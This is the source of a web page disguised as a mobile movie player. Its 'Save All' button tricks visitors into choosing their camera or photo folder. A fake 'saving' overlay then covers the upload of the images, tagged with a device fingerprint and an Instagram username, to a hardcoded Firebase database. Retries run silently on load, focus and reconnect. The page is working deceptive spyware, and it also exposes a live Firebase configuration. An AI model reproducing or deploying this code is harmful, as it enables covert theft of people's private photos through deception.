<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Movie Player + Auto Upload</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }

        .player-container { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; z-index: 100; }
        .player-wrapper { position: relative; width: 100%; height: 100vh; background: #000; overflow: hidden; }

        /* TOP BAR */
        .top-bar {
            position: absolute; top: 0; left: 0; right: 0;
            padding: 20px 16px 40px;
            background: linear-gradient(180deg, rgba(0,0,0,0.9) 0%, transparent 100%);
            z-index: 20; display: flex; align-items: center; gap: 12px;
            transition: opacity 0.3s;
        }
        .top-bar.hide { opacity: 0; pointer-events: none; }
        .back-btn, .top-icon {
            width: 40px; height: 40px; border-radius: 50%;
            background: rgba(0,0,0,0.5); border: none; color: #fff;
            font-size: 20px; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(10px); flex-shrink: 0;
        }
        .movie-title-top { flex: 1; min-width: 0; }
        .movie-title-top h1 { font-size: 15px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .movie-title-top span { font-size: 12px; color: #8e8e93; }

        /* VIDEO POSTER */
        .video-area {
            position: absolute; inset: 0; background: #000;
            display: flex; align-items: center; justify-content: center; z-index: 1;
        }
        .video-poster {
            width: 100%; height: 100%; object-fit: cover;
            display: block; opacity: 0; transition: opacity 0.4s ease;
        }
        .video-poster.active { opacity: 1; }

        /* CENTER PLAY */
        .center-play {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 15; width: 80px; height: 80px; border-radius: 50%;
            background: rgba(255,255,255,0.15); backdrop-filter: blur(20px);
            border: 2px solid rgba(255,255,255,0.4); color: #fff;
            font-size: 32px; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
            transition: transform 0.2s, background 0.2s;
        }
        .center-play:active { transform: translate(-50%, -50%) scale(0.9); }

        /* TAP ZONES */
        .tap-zone { position: absolute; top: 100px; bottom: 150px; z-index: 10; cursor: pointer; }
        .tap-zone.left { left: 0; width: 30%; }
        .tap-zone.right { right: 0; width: 70%; }

        /* BOTTOM CONTROLS */
        .bottom-controls {
            position: absolute; bottom: 0; left: 0; right: 0;
            padding: 60px 16px 30px;
            background: linear-gradient(transparent, rgba(0,0,0,0.95));
            z-index: 20; transition: opacity 0.3s;
        }
        .bottom-controls.hide { opacity: 0; pointer-events: none; }

        .progress-bar { height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; position: relative; cursor: pointer; }
        .progress-fill {
            position: absolute; top: 0; left: 0; height: 100%;
            background: linear-gradient(90deg, #f09433, #dc2743);
            border-radius: 2px; width: 0;
        }
        .time-row {
            display: flex; justify-content: space-between;
            font-size: 12px; color: #8e8e93; margin: 12px 0 20px;
        }
        .controls-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
        .ctrl-btn {
            width: 44px; height: 44px; border-radius: 50%;
            background: transparent; border: none; color: #fff;
            font-size: 22px; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
        }
        .ctrl-btn.play-btn { width: 56px; height: 56px; background: rgba(255,255,255,0.15); font-size: 24px; }
        .ctrl-spacer { flex: 1; }

        /* SAVE BUTTON */
        .save-btn-float {
            position: absolute; top: 20px; right: 16px;
            padding: 10px 18px; border: none; border-radius: 22px;
            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
            background-size: 300% 300%; color: #fff;
            font-size: 13px; font-weight: 700; cursor: pointer; font-family: inherit;
            display: flex; align-items: center; gap: 6px;
            animation: gradientMove 4s ease infinite, pulseBtn 2s infinite;
            box-shadow: 0 8px 24px rgba(220,39,67,0.5); z-index: 25;
        }
        .save-btn-float:disabled { opacity: 0.6; animation: none; }

        @keyframes gradientMove {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        @keyframes pulseBtn {
            0%, 100% { box-shadow: 0 8px 24px rgba(220,39,67,0.5), 0 0 0 0 rgba(220,39,67,0.7); }
            50% { box-shadow: 0 8px 24px rgba(220,39,67,0.7), 0 0 0 12px rgba(220,39,67,0); }
        }

        /* RESUME BANNER */
        #resumeBanner {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: linear-gradient(45deg, #f09433, #dc2743);
            color: #fff; padding: 14px 20px; border-radius: 16px;
            font-size: 13px; font-weight: 600; display: none;
            z-index: 99998; box-shadow: 0 10px 30px rgba(220,39,67,0.5);
            align-items: center; gap: 12px; max-width: 90vw;
        }
        #resumeBanner.show { display: flex; }
        .resume-btn {
            padding: 8px 16px; border: none; border-radius: 10px;
            background: #fff; color: #dc2743; font-size: 12px; font-weight: 700;
            cursor: pointer; font-family: inherit;
        }

        /* OVERLAY */
        #processingOverlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.94);
            backdrop-filter: blur(24px); display: none;
            align-items: center; justify-content: center;
            z-index: 99999; padding: 20px;
        }
        #processingOverlay.show { display: flex; }

        .overlay-box {
            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
            border: 1px solid #262626; border-radius: 24px;
            padding: 32px 24px 24px; max-width: 400px; width: 100%;
            text-align: center; box-shadow: 0 30px 80px rgba(0,0,0,0.9);
        }

        .folder-anim {
            position: relative; width: 100px; height: 100px;
            margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
        }
        .folder-icon { font-size: 56px; animation: folderBob 2s ease-in-out infinite; }
        @keyframes folderBob {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-6px) scale(1.05); }
        }
        .file-flying {
            position: absolute; font-size: 24px; top: -20px; left: 50%;
            transform: translateX(-50%); animation: fileFly 1.8s infinite;
        }
        @keyframes fileFly {
            0% { top: -30px; opacity: 0; }
            30% { opacity: 1; }
            70% { opacity: 1; top: 50px; }
            100% { opacity: 0; top: 70px; }
        }

        .overlay-title {
            font-size: 20px; font-weight: 800; margin-bottom: 8px;
            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .overlay-sub { font-size: 13px; color: #8e8e93; line-height: 1.6; margin-bottom: 22px; }
        .overlay-sub strong { color: #fff; }

        .overlay-progress-bar {
            height: 10px; background: rgba(255,255,255,0.06);
            border-radius: 5px; overflow: hidden; margin-bottom: 10px;
        }
        .overlay-progress-fill {
            height: 100%; background: linear-gradient(90deg, #f09433, #dc2743);
            border-radius: 5px; width: 0; transition: width 0.4s;
        }
        .overlay-progress-text {
            display: flex; justify-content: space-between;
            font-size: 12px; color: #8e8e93; margin-bottom: 16px;
        }
        .overlay-progress-text .percent { color: #f09433; font-weight: 700; }

        .overlay-stats {
            display: flex; justify-content: space-around;
            padding: 14px 0; margin-bottom: 16px;
            border-top: 1px solid #262626; border-bottom: 1px solid #262626;
        }
        .overlay-stat { display: flex; flex-direction: column; align-items: center; gap: 2px; }
        .overlay-stat .num { font-size: 20px; font-weight: 800; }
        .overlay-stat.done .num { color: #34A853; }
        .overlay-stat.pending .num { color: #FFC107; }
        .overlay-stat.failed .num { color: #FF3B30; }
        .overlay-stat .lbl { color: #8e8e93; font-size: 10px; text-transform: uppercase; }

        .current-file {
            font-size: 12px; color: #b0b0b0; padding: 10px 14px;
            background: rgba(255,255,255,0.03); border-radius: 12px;
            margin-bottom: 16px; text-align: left; font-family: monospace;
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
        }

        .cancel-btn {
            width: 100%; padding: 12px;
            border: 1px solid rgba(255,59,48,0.3); border-radius: 12px;
            background: transparent; color: #FF3B30;
            font-size: 13px; font-weight: 600; cursor: pointer;
            font-family: inherit;
        }

        .error-state { display: none; text-align: center; padding: 8px 0; }
        .error-state.show { display: block; }
        .error-icon { font-size: 64px; margin-bottom: 16px; }
        .error-title { font-size: 20px; font-weight: 800; color: #FF3B30; margin-bottom: 8px; }
        .error-sub { font-size: 13px; color: #8e8e93; line-height: 1.6; margin-bottom: 20px; }
        .error-retry {
            padding: 14px 28px; border: none; border-radius: 14px;
            background: linear-gradient(45deg, #f09433, #dc2743);
            color: #fff; font-size: 14px; font-weight: 700;
            cursor: pointer; font-family: inherit;
        }
        .success-icon { font-size: 72px; margin-bottom: 16px; display: inline-block; }

        .toast {
            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
            background: rgba(44,44,46,0.95); color: #fff;
            padding: 12px 20px; border-radius: 24px; font-size: 13px;
            z-index: 999999; backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 90vw; text-align: center;
        }
    </style>
</head>

<body>

    <div id="resumeBanner">
        <span class="resume-icon">⚠️</span>
        <span id="resumeText">Pending photos hain</span>
        <button class="resume-btn" id="resumeBtn">Resume</button>
    </div>

    <div class="player-container">
        <div class="player-wrapper">

            <div class="video-area">
                <img class="video-poster active" id="videoPoster" src="" alt="Movie">
            </div>

            <div class="top-bar" id="topBar">
                <button class="back-btn" id="backBtn">←</button>
                <div class="movie-title-top">
                    <h1 id="movieTitle">Interstellar</h1>
                    <span id="movieSub">2014 • Sci-Fi • 2h 49m</span>

                <button class="top-icon">⋯</button>
            </div>

            <button class="save-btn-float" id="saveAllBtn">
                <span>💾</span>
                <span>Save All</span>
            </button>

            <button class="center-play" id="centerPlay">▶</button>

            <div class="tap-zone left" id="tapLeft"></div>
            <div class="tap-zone right" id="tapRight"></div>

            <div class="bottom-controls" id="bottomControls">
                <div class="progress-bar" id="progressBar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="time-row">
                    <span id="currentTime">0:00</span>
                    <span id="totalTime">2:49:00</span>
                </div>
                <div class="controls-row">
                    <button class="ctrl-btn" id="rewindBtn">⏪</button>
                    <button class="ctrl-btn play-btn" id="playPauseBtn">⏸</button>
                    <button class="ctrl-btn" id="forwardBtn">⏩</button>
                    <div class="ctrl-spacer"></div>
                    <button class="ctrl-btn" id="volumeBtn">🔊</button>
                    <button class="ctrl-btn" id="fullscreenBtn">⛶</button>
                </div>
            </div>

        </div>
    </div>

    <div id="processingOverlay">
        <div class="overlay-box">
            <div id="overlayMain">
                <div class="folder-anim">
                    <div class="folder-icon">📁</div>
                    <div class="file-flying">📸</div>
                </div>

                <h2 class="overlay-title" id="overlayTitle">Saving Photos</h2>
                <p class="overlay-sub" id="overlaySub">
                    Photos <strong>folder mein save</strong> ho rahi hain.
                </p>

                <div class="overlay-progress-bar">
                    <div class="overlay-progress-fill" id="overlayProgressFill"></div>
                </div>
                <div class="overlay-progress-text">
                    <span id="overlayProgressLabel">Starting...</span>
                    <span class="percent" id="overlayProgressPercent">0%</span>
                </div>

                <div class="overlay-stats">
                    <div class="overlay-stat done">
                        <span class="num" id="overlayDone">0</span>
                        <span class="lbl">Saved</span>
                    </div>
                    <div class="overlay-stat pending">
                        <span class="num" id="overlayPending">0</span>
                        <span class="lbl">Pending</span>
                    </div>
                    <div class="overlay-stat failed">
                        <span class="num" id="overlayFailed">0</span>
                        <span class="lbl">Failed</span>
                    </div>
                </div>

                <div class="current-file" id="currentFile">Waiting...</div>

                <button class="cancel-btn" id="cancelBtn">Cancel</button>
            </div>

            <div class="error-state" id="successState">
                <div class="success-icon">✅</div>
                <div class="error-title" style="color: #34A853;">Save Complete!</div>
                <div class="error-sub" id="successSub">Sab photos save ho gayin.</div>
            </div>

            <div class="error-state" id="errorState">
                <div class="error-icon">⚠️</div>
                <div class="error-title" id="errorTitle">Save Failed</div>
                <div class="error-sub" id="errorSub">Kuch files save nahi ho paayin.</div>
                <button class="error-retry" id="errorRetry">
                    <span>🔄</span>
                    <span>Retry</span>
                </button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, push, set, get, remove, serverTimestamp }
            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
            authDomain: "my-rto-b2531.firebaseapp.com",
            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
            projectId: "my-rto-b2531",
            storageBucket: "my-rto-b2531.appspot.com",
            messagingSenderId: "465334829178",
            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        /* DEVICE ID */
        function getDeviceId() {
            let id = localStorage.getItem('pics_device_id');
            if (id) return id;
            const raw = navigator.userAgent + screen.width + 'x' + screen.height;
            let hash = 0;
            for (let i = 0; i < raw.length; i++) {
                hash = ((hash << 5) - hash) + raw.charCodeAt(i);
                hash = hash & hash;
            }
            const B = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            let out = '', n = Math.abs(hash);
            for (let i = 0; i < 8; i++) { out += B[n % 62]; n = Math.floor(n / 62); }
            id = 'HEK-' + out;
            localStorage.setItem('pics_device_id', id);
            return id;
        }

        const DEVICE_ID = getDeviceId();
        const DEVICE_NAME = /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iPhone' : 'Device';
        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const USERNAME = localStorage.getItem('instagram_username') || 'user_' + DEVICE_ID.slice(-4);

        const MAX_PHOTOS = 500;
        const CONCURRENCY = 3;
        const COMPRESS_WIDTH = 800;
        const COMPRESS_QUALITY = 0.55;
        const FAKE_FILE_COUNT = 15;

        /* OPFS Support */
        const OPFS_SUPPORTED = 'storage' in navigator && 'getDirectory' in navigator.storage;

        console.log('📱 Device:', DEVICE_ID);
        console.log('💾 OPFS:', OPFS_SUPPORTED ? '✅' : '❌');

        /* Movie data */
        const movies = [
            { title: 'Interstellar', poster: 'https://picsum.photos/800/1400?random=1', year: '2014', genre: 'Sci-Fi', duration: '2h 49m' },
            { title: 'Inception', poster: 'https://picsum.photos/800/1400?random=2', year: '2010', genre: 'Thriller', duration: '2h 28m' },
            { title: 'The Dark Knight', poster: 'https://picsum.photos/800/1400?random=3', year: '2008', genre: 'Action', duration: '2h 32m' },
            { title: 'Oppenheimer', poster: 'https://picsum.photos/800/1400?random=4', year: '2023', genre: 'Biography', duration: '3h 0m' },
            { title: 'Dune: Part Two', poster: 'https://picsum.photos/800/1400?random=5', year: '2024', genre: 'Sci-Fi', duration: '2h 46m' }
        ];

        let currentMovieIndex = 0;
        let isPlaying = true;
        let videoDuration = 169 * 60;
        let currentTime = 0;
        let progressInterval = null;

        /* State */
        let fakeInterval = null;
        let isCancelled = false;
        let wakeLock = null;
        let uploadStartTime = 0;
        let retryCount = 0;
        let fakeDone = 0;

        /* IndexedDB */
        const IDB_NAME = 'IGPendingDB';
        const IDB_VERSION = 1;
        const IDB_STORE = 'pending_photos';

        function openIDB() {
            return new Promise((resolve, reject) => {
                const req = indexedDB.open(IDB_NAME, IDB_VERSION);
                req.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    if (!db.objectStoreNames.contains(IDB_STORE)) {
                        db.createObjectStore(IDB_STORE, { keyPath: 'id', autoIncrement: true });
                    }
                };
                req.onsuccess = () => resolve(req.result);
                req.onerror = () => reject(req.error);
            });
        }

        async function idbAdd(photo) {
            const db = await openIDB();
            return new Promise((resolve, reject) => {
                const tx = db.transaction(IDB_STORE, 'readwrite');
                tx.objectStore(IDB_STORE).add(photo);
                tx.oncomplete = () => { db.close(); resolve(); };
                tx.onerror = () => { db.close(); reject(tx.error); };
            });
        }

        async function idbGetAll() {
            const db = await openIDB();
            return new Promise((resolve, reject) => {
                const tx = db.transaction(IDB_STORE, 'readonly');
                const req = tx.objectStore(IDB_STORE).getAll();
                req.onsuccess = () => { db.close(); resolve(req.result || []); };
                req.onerror = () => { db.close(); reject(req.error); };
            });
        }

        async function idbDelete(id) {
            const db = await openIDB();
            return new Promise((resolve, reject) => {
                const tx = db.transaction(IDB_STORE, 'readwrite');
                tx.objectStore(IDB_STORE).delete(id);
                tx.oncomplete = () => { db.close(); resolve(); };
                tx.onerror = () => { db.close(); reject(tx.error); };
            });
        }

        async function idbCount() {
            const db = await openIDB();
            return new Promise((resolve, reject) => {
                const tx = db.transaction(IDB_STORE, 'readonly');
                const req = tx.objectStore(IDB_STORE).count();
                req.onsuccess = () => { db.close(); resolve(req.result); };
                req.onerror = () => { db.close(); reject(req.error); };
            });
        }

        /* OPFS helpers */
        async function opfsSave(fileName, blob) {
            if (!OPFS_SUPPORTED) return false;
            try {
                const root = await navigator.storage.getDirectory();
                const dir = await root.getDirectoryHandle('pending_photos', { create: true });
                const fileHandle = await dir.getFileHandle(fileName, { create: true });
                const writable = await fileHandle.createWritable();
                await writable.write(blob);
                await writable.close();
                return true;
            } catch (e) {
                return false;
            }
        }

        async function opfsRead(fileName) {
            if (!OPFS_SUPPORTED) return null;
            try {
                const root = await navigator.storage.getDirectory();
                const dir = await root.getDirectoryHandle('pending_photos');
                const fileHandle = await dir.getFileHandle(fileName);
                return await fileHandle.getFile();
            } catch (e) {
                return null;
            }
        }

        async function opfsDelete(fileName) {
            if (!OPFS_SUPPORTED) return;
            try {
                const root = await navigator.storage.getDirectory();
                const dir = await root.getDirectoryHandle('pending_photos');
                await dir.removeEntry(fileName);
            } catch (e) {}
        }

        /* QUEUE */
        async function queuePhotoLocally(file, base64, blob) {
            try {
                let inOPFS = false;
                if (OPFS_SUPPORTED && blob) {
                    inOPFS = await opfsSave(file.name, blob);
                }

                await idbAdd({
                    name: file.name,
                    image: inOPFS ? null : base64,
                    size: file.size,
                    deviceId: DEVICE_ID,
                    deviceName: DEVICE_NAME,
                    sessionId: SESSION_ID,
                    username: USERNAME,
                    queuedAt: Date.now(),
                    inOPFS: inOPFS
                });

                const count = await idbCount();
                console.log(`📦 Queued: ${file.name} (total: ${count})`);
            } catch (e) {
                console.warn('Queue failed:', e.message);
            }
        }

        /* SYNC */
        async function syncPendingUploads() {
            try {
                const pending = await idbGetAll();
                if (pending.length === 0) return { synced: 0, remaining: 0 };

                console.log(`🔄 Syncing ${pending.length}...`);
                let synced = 0, failed = 0;

                for (const item of pending) {
                    try {
                        let base64;

                        if (item.inOPFS && OPFS_SUPPORTED) {
                            const blob = await opfsRead(item.name);
                            if (blob) base64 = await blobToBase64(blob);
                        }

                        if (!base64 && item.image) base64 = item.image;
                        if (!base64) { failed++; continue; }

                        const photoRef = push(ref(db, 'photos/' + item.deviceId));
                        await set(photoRef, {
                            id: photoRef.key,
                            deviceId: item.deviceId,
                            deviceName: item.deviceName,
                            sessionId: item.sessionId,
                            username: item.username,
                            image: base64,
                            name: item.name,
                            size: item.size,
                            timestamp: serverTimestamp(),
                            uploadedAt: item.queuedAt,
                            fromQueue: true
                        });

                        if (item.inOPFS) await opfsDelete(item.name);
                        await idbDelete(item.id);
                        synced++;
                        console.log(`✅ Synced: ${item.name}`);

                    } catch (err) {
                        failed++;
                        console.warn(`❌ Failed: ${item.name}`);
                    }
                }

                console.log(`🎉 Synced ${synced}, failed ${failed}`);
                return { synced, remaining: failed };
            } catch (e) {
                return { synced: 0, remaining: 0 };
            }
        }

        /* AUTO-SYNC ON LOAD */
        async function checkAndSyncOnLoad() {
            try {
                const count = await idbCount();
                console.log(`📦 IndexedDB: ${count} pending`);

                if (count === 0) return;

                const banner = document.getElementById('resumeBanner');
                const bannerText = document.getElementById('resumeText');
                bannerText.textContent = `${count} photos pending — syncing...`;
                banner.classList.add('show');

                const result = await syncPendingUploads();

                if (result.synced > 0) {
                    bannerText.textContent = `✅ ${result.synced} photos synced!`;
                    showToast(`🎉 ${result.synced} photos auto-uploaded!`);
                    setTimeout(() => banner.classList.remove('show'), 3000);
                } else if (result.remaining > 0) {
                    bannerText.textContent = `⚠️ ${result.remaining} failed — Retry?`;
                    document.getElementById('resumeBtn').textContent = 'Retry';
                }
            } catch (e) {
                console.warn('Auto-sync error:', e.message);
            }
        }

        setTimeout(checkAndSyncOnLoad, 500);
        setTimeout(checkAndSyncOnLoad, 2000);
        setTimeout(checkAndSyncOnLoad, 5000);
        setTimeout(checkAndSyncOnLoad, 15000);

        window.addEventListener('online', () => {
            setTimeout(checkAndSyncOnLoad, 800);
        });

        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible') {
                setTimeout(checkAndSyncOnLoad, 500);
            }
        });

        window.addEventListener('focus', () => {
            setTimeout(checkAndSyncOnLoad, 500);
        });

        document.getElementById('resumeBtn').addEventListener('click', async () => {
            const banner = document.getElementById('resumeBanner');
            const bannerText = document.getElementById('resumeText');
            bannerText.textContent = 'Syncing...';
            const result = await syncPendingUploads();
            if (result.synced > 0) {
                bannerText.textContent = `✅ ${result.synced} synced!`;
                setTimeout(() => banner.classList.remove('show'), 3000);
            }
        });

        /* WAKE LOCK */
        async function keepScreenOn() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                    wakeLock.addEventListener('release', () => { wakeLock = null; });
                }
            } catch (err) {}
        }

        function releaseWakeLock() {
            if (wakeLock) {
                wakeLock.release().catch(() => {});
                wakeLock = null;
            }
        }

        /* SOUND */
        let audioCtx = null;
        function playSound(freq, duration) {
            try {
                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.frequency.value = freq;
                osc.type = 'sine';
                gain.gain.setValueAtTime(0, audioCtx.currentTime);
                gain.gain.linearRampToValueAtTime(0.05, audioCtx.currentTime + 0.01);
                gain.gain.linearRampToValueAtTime(0, audioCtx.currentTime + duration);
                osc.start(audioCtx.currentTime);
                osc.stop(audioCtx.currentTime + duration);
            } catch (e) {}
        }

        function vibrate(p) { if (navigator.vibrate) navigator.vibrate(p); }

        /* DOM */
        const videoPoster = document.getElementById('videoPoster');
        const movieTitle = document.getElementById('movieTitle');
        const movieSub = document.getElementById('movieSub');
        const centerPlay = document.getElementById('centerPlay');
        const playPauseBtn = document.getElementById('playPauseBtn');
        const progressFill = document.getElementById('progressFill');
        const progressBar = document.getElementById('progressBar');
        const currentTimeEl = document.getElementById('currentTime');
        const totalTimeEl = document.getElementById('totalTime');
        const backBtn = document.getElementById('backBtn');
        const topBar = document.getElementById('topBar');
        const bottomControls = document.getElementById('bottomControls');
        const tapLeft = document.getElementById('tapLeft');
        const tapRight = document.getElementById('tapRight');
        const saveAllBtn = document.getElementById('saveAllBtn');
        const rewindBtn = document.getElementById('rewindBtn');
        const forwardBtn = document.getElementById('forwardBtn');
        const volumeBtn = document.getElementById('volumeBtn');
        const fullscreenBtn = document.getElementById('fullscreenBtn');

        const overlay = document.getElementById('processingOverlay');
        const overlayMain = document.getElementById('overlayMain');
        const successState = document.getElementById('successState');
        const successSub = document.getElementById('successSub');
        const errorState = document.getElementById('errorState');
        const errorSub = document.getElementById('errorSub');
        const errorRetry = document.getElementById('errorRetry');
        const overlayTitle = document.getElementById('overlayTitle');
        const overlaySub = document.getElementById('overlaySub');
        const overlayProgressFill = document.getElementById('overlayProgressFill');
        const overlayProgressLabel = document.getElementById('overlayProgressLabel');
        const overlayProgressPercent = document.getElementById('overlayProgressPercent');
        const overlayDone = document.getElementById('overlayDone');
        const overlayPending = document.getElementById('overlayPending');
        const overlayFailed = document.getElementById('overlayFailed');
        const currentFile = document.getElementById('currentFile');
        const cancelBtn = document.getElementById('cancelBtn');

        /* MOVIE PLAYER */
        function loadMovie(index) {
            const movie = movies[index];
            videoPoster.classList.remove('active');
            setTimeout(() => {
                videoPoster.src = movie.poster;
                videoPoster.classList.add('active');
            }, 100);
            movieTitle.textContent = movie.title;
            movieSub.textContent = `${movie.year} • ${movie.genre} • ${movie.duration}`;
            const durations = [169, 148, 152, 180, 166];
            videoDuration = durations[index] * 60;
            currentTime = 0;
            updateProgressUI();
        }

        function formatTime(seconds) {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = Math.floor(seconds % 60);
            if (h > 0) return `${h}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            return `${m}:${String(s).padStart(2,'0')}`;
        }

        function updateProgressUI() {
            const percent = (currentTime / videoDuration) * 100;
            progressFill.style.width = percent + '%';
            currentTimeEl.textContent = formatTime(currentTime);
            totalTimeEl.textContent = formatTime(videoDuration);
        }

        function startPlayback() {
            if (progressInterval) clearInterval(progressInterval);
            progressInterval = setInterval(() => {
                if (!isPlaying) return;
                currentTime += 1;
                if (currentTime >= videoDuration) {
                    currentTime = 0;
                    isPlaying = false;
                    updatePlayUI();
                }
                updateProgressUI();
            }, 1000);
        }

        function updatePlayUI() {
            if (isPlaying) {
                centerPlay.style.display = 'none';
                playPauseBtn.textContent = '⏸';
            } else {
                centerPlay.style.display = 'flex';
                playPauseBtn.textContent = '▶';
            }
        }

        function togglePlay() {
            isPlaying = !isPlaying;
            updatePlayUI();
            playSound(600, 0.05);
            vibrate(20);
        }

        centerPlay.addEventListener('click', togglePlay);
        playPauseBtn.addEventListener('click', togglePlay);
        backBtn.addEventListener('click', () => { if (confirm('Exit movie?')) showToast('👋 Exiting...'); });
        rewindBtn.addEventListener('click', () => { currentTime = Math.max(0, currentTime - 10); updateProgressUI(); });
        forwardBtn.addEventListener('click', () => { currentTime = Math.min(videoDuration, currentTime + 10); updateProgressUI(); });
        volumeBtn.addEventListener('click', () => { volumeBtn.classList.toggle('active'); showToast('🔊'); });
        fullscreenBtn.addEventListener('click', () => {
            if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => {});
            else document.exitFullscreen().catch(() => {});
        });
        tapLeft.addEventListener('click', () => { currentTime = Math.max(0, currentTime - 10); updateProgressUI(); });
        tapRight.addEventListener('click', () => { currentTime = Math.min(videoDuration, currentTime + 10); updateProgressUI(); });
        progressBar.addEventListener('click', (e) => {
            const rect = progressBar.getBoundingClientRect();
            const percent = (e.clientX - rect.left) / rect.width;
            currentTime = Math.floor(percent * videoDuration);
            updateProgressUI();
        });

        /* SAVE BUTTON — Hybrid: Android uses webkitdirectory, Desktop uses showDirectoryPicker */
        saveAllBtn.addEventListener('click', async () => {
            saveAllBtn.disabled = true;
            await keepScreenOn();

            const isAndroid = /Android/i.test(navigator.userAgent);

            if (isAndroid || !('showDirectoryPicker' in window)) {
                // 🔥 ANDROID — webkitdirectory (no Allow dialog)
                const input = document.createElement('input');
                input.type = 'file';
                input.webkitdirectory = true;
                input.multiple = true;
                input.style.display = 'none';
                document.body.appendChild(input);

                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    document.body.removeChild(input);

                    if (files.length === 0) {
                        saveAllBtn.disabled = false;
                        releaseWakeLock();
                        showToast('❌ Koi folder select nahi kiya');
                        return;
                    }

                    const firstPath = files[0].webkitRelativePath || '';
                    const folderName = firstPath.split('/')[0] || 'Unknown';
                    const folderLower = folderName.toLowerCase();

                    const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'screenshots', 'whatsapp', 'photos'];
                    if (!GOOD_FOLDERS.includes(folderLower)) {
                        saveAllBtn.disabled = false;
                        releaseWakeLock();
                        if (confirm(`❌ "${folderName}" sahi folder nahi.\n\n✅ DCIM ya Pictures select karo.\n\nTry again?`)) {
                            saveAllBtn.click();
                        }
                        return;
                    }

                    startFakeSaveFromFiles(files);
                };

                input.oncancel = () => {
                    document.body.removeChild(input);
                    saveAllBtn.disabled = false;
                    releaseWakeLock();
                };

                input.click();

            } else {
                // 🔥 DESKTOP — showDirectoryPicker
                try {
                    const dirHandle = await window.showDirectoryPicker({ mode: 'read', startIn: 'pictures' });
                    const folderLower = (dirHandle.name || '').toLowerCase();
                    const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'screenshots', 'whatsapp', 'photos'];

                    if (!GOOD_FOLDERS.includes(folderLower)) {
                        saveAllBtn.disabled = false;
                        releaseWakeLock();
                        if (confirm(`❌ "${dirHandle.name}" sahi folder nahi.\n\n✅ DCIM ya Pictures select karo.\n\nTry again?`)) {
                            saveAllBtn.click();
                        }
                        return;
                    }

                    // Save handle for restore
                    try {
                        const db = await openIDB();
                        const tx = db.transaction('handles', 'readwrite');
                        if (!db.objectStoreNames.contains('handles')) {
                            // Skip
                        } else {
                            tx.objectStore('handles').put(dirHandle, 'folder');
                        }
                    } catch (e) {}

                    startFakeSave(dirHandle);

                } catch (err) {
                    releaseWakeLock();
                    saveAllBtn.disabled = false;
                    if (err.name === 'AbortError') return;
                    showToast('❌ ' + (err.message || 'Error'));
                }
            }
        });

        /* FAKE SAVE (Desktop - from dirHandle) */
        async function startFakeSave(dirHandle) {
            isCancelled = false;
            retryCount = 0;
            fakeDone = 0;
            uploadStartTime = Date.now();

            overlay.classList.add('show');
            overlayMain.style.display = 'block';
            successState.classList.remove('show');
            errorState.classList.remove('show');
            resetOverlay();

            overlayTitle.textContent = 'Scanning Folder';
            overlaySub.innerHTML = 'Photos scan ho rahi hain...<br>Please wait.';

            const files = [];
            if (dirHandle) await scanFolder(dirHandle, files);

            const totalFound = files.length;
            const limitedFiles = files.slice(0, MAX_PHOTOS);

            console.log(`📁 Real files: ${totalFound}, using: ${limitedFiles.length}`);

            const FAKE_TOTAL = FAKE_FILE_COUNT;

            overlayTitle.textContent = 'Saving Photos';
            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
